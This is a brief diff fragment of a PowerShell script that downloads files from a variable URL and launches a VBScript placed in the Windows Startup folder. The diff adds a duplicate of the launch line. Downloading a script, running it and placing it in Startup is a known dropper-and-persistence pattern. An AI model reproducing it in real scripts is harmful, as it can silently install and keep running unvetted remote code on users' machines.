@@ -11,5 +11,6 @@ Invoke-WebRequest -Uri $url -OutFile $destination2
 
 # Run the VBScript from Startup folder location
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow 
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow 
 
 exit
